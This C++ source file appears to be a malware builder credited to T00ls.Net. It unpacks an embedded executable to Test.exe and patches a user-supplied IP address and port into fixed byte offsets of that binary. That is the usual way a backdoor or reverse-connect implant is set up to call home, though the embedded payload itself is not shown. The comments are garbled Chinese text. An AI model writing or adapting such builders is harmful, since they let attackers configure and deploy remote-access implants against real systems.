// VcConsoleTest1.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"

#include "resource.h"

#include<windows.h>
#include<stdio.h>
#include<stdlib.h>

BOOL ReleaseRes(char* strFileName, WORD wResID, char* strFileType)
{
	// ��Դ��С  
	DWORD   dwWrite = 0;

	// �����ļ�  
	HANDLE  hFile = CreateFile(strFileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// ������Դ�ļ��С�������Դ���ڴ桢�õ���Դ��С  
	HRSRC   hrsc = FindResource(NULL, MAKEINTRESOURCE(wResID), strFileType);
	HGLOBAL hG = LoadResource(NULL, hrsc);
	DWORD   dwSize = SizeofResource(NULL, hrsc);

	// д���ļ�  
	WriteFile(hFile, hG, dwSize, &dwWrite, NULL);
	CloseHandle(hFile);
	return TRUE;
}

void Usage()
{
	printf("usage:generate.exe ip port\n");
	printf("By T00ls.Net");
}

int main(int argc, char * argv[])
{
	DWORD dwSize;

	char szIp[20] = {0};
	char szPort[10] = {0};


	if (argc != 3)
	{
		Usage();
		return 0;
	}

	strcpy(szIp,argv[1]);
	strcpy(szPort, argv[2]);


	unsigned char cIp[5] = { 0 };
	unsigned char cPort[3] = { 0 };




	ReleaseRes("Test.exe", (WORD)IDR_EXE1, "EXE");

	//�˿�ת��
	char pHexPort[5] = { 0 };
	sprintf(pHexPort, "%04x", atoi(szPort));


	for (int i = 0; i<2; i++)
	{
		char szByte[3] = { 0 };
		sprintf(szByte, "%c%c", pHexPort[i * 2], pHexPort[i * 2 + 1]);
		cPort[i] = (int)strtol(szByte, NULL, 16);
		//printf("%x\n", cPort[i]);
	}

	//ipת��

	int nIndex = 0;
	char* p = NULL;
	for (p = strtok(szIp, "."); p != NULL; p = strtok(NULL, "."))
	{
		cIp[nIndex] = atoi(p);
		nIndex++;
		//printf("%s\n", p);
	}


	HANDLE FileHandle = CreateFile("Test.exe", GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	SetFilePointer(FileHandle, 0x2ef8, NULL, FILE_BEGIN);
	WriteFile(FileHandle, cIp, 4, &dwSize, NULL);

	

	SetFilePointer(FileHandle, 0x2f00, NULL, FILE_BEGIN);
	WriteFile(FileHandle, cPort, 2, &dwSize, NULL);
	
	return 0;
}